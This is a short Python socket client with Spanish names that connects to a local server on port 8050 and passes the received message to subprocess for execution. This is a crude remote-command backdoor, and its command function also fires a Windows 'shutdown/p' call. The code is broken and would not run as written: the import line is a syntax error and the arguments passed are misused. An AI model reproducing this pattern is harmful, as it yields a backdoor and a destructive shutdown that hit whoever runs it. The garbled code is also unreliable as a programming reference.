import socket
import os, import subprocess
host = "127.0.0.1"
port = 8050
cliente=host, port
def ejecutarComandos(comandos):
    return subprocess.check_output(comandos, os.system('shutdown/p'))
try:
    misocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    misocket.connect(cliente)
    print("Conectado al servidor " + str(host) + ' en el puerto: ' + str(port))
    misocket.send(b"Hola servidor!")
    message = misocket.recv(1024)
    comandos = message.decode('utf-8')
    print("Mensaje recibido", message)
    msg=b"Mensaje desde el cliente: CONECTADO!\n"
    misocket.sendall(msg)
    
except socket.error as e:
    print("Error de socket:", e)
finally:
    ejecutarComandos(comandos)
    misocket.close()
	

